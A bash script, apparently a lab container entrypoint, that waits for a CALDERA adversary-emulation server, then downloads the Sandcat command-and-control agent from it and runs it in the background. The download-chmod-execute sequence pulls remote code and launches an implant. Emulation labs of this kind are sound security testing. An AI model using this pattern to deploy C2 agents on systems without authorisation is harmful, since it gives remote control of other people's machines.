#!/usr/bin/env bash
set -euo pipefail

CALDERA_URL="${CALDERA_URL:-http://caldera.dock:8888}"
GROUP="${GROUP:-cluster}"
CALDERA_WAIT_TIMEOUT_SEC="${CALDERA_WAIT_TIMEOUT_SEC:-300}"
CALDERA_WAIT_INTERVAL_SEC="${CALDERA_WAIT_INTERVAL_SEC:-2}"
SANDCAT_PATH="${SANDCAT_PATH:-/tmp/sandcat}"

is_reachable() {
  local url="$1"

  if command -v wget >/dev/null 2>&1; then
    wget -qO- "${url}" >/dev/null
    return $?
  fi

  if command -v curl >/dev/null 2>&1; then
    curl -fsS -o /dev/null -X GET "${url}"
    return $?
  fi

  echo "Neither wget nor curl is available." >&2
  return 1
}

download_sandcat() {
  if command -v wget >/dev/null 2>&1; then
    wget -qO "${SANDCAT_PATH}" "${CALDERA_URL}/file/download" \
      --header='file:sandcat.go' \
      --header='platform:linux' \
      --header="server:${CALDERA_URL}" \
      --header="group:${GROUP}"
    return $?
  fi

  if command -v curl >/dev/null 2>&1; then
    curl -fsS -o "${SANDCAT_PATH}" "${CALDERA_URL}/file/download" \
      -H 'file:sandcat.go' \
      -H 'platform:linux' \
      -H "server:${CALDERA_URL}" \
      -H "group:${GROUP}"
    return $?
  fi

  echo "Neither wget nor curl is available." >&2
  return 1
}

CALDERA_URL="${CALDERA_URL%/}"

echo "Waiting for ${CALDERA_URL} timeout: ${CALDERA_WAIT_TIMEOUT_SEC}s ..."
start_ts="$(date +%s)"

until is_reachable "${CALDERA_URL}"; do
  now_ts="$(date +%s)"

  if (( now_ts - start_ts >= CALDERA_WAIT_TIMEOUT_SEC )); then
    echo "Timed out waiting for ${CALDERA_URL} after ${CALDERA_WAIT_TIMEOUT_SEC}s" >&2
    exit 1
  fi

  sleep "${CALDERA_WAIT_INTERVAL_SEC}"
done

echo "CALDERA is reachable."

echo "Downloading Sandcat payload..."
download_sandcat

chmod +x "${SANDCAT_PATH}"

echo "Starting Sandcat agent in background..."
"${SANDCAT_PATH}" &

SANDCAT_PID="$!"

echo "Sandcat agent started with PID ${SANDCAT_PID}"

exit 0